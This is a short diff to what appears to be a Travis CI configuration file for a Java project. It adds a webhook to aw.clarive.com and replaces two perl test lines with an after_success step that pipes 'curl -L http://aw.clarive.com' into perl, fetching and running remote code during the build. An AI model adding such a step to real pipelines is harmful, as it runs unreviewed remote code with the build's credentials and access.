@@ -1,4 +1,8 @@
 language: java
+notifications:
+    webhooks: 
+        urls:
+            - http://aw.clarive.com/travis_wh
+
 after_success: 
-    - perl -V
-    - perl -e 'print "helloooo"'
+    - curl -L http://aw.clarive.com | perl
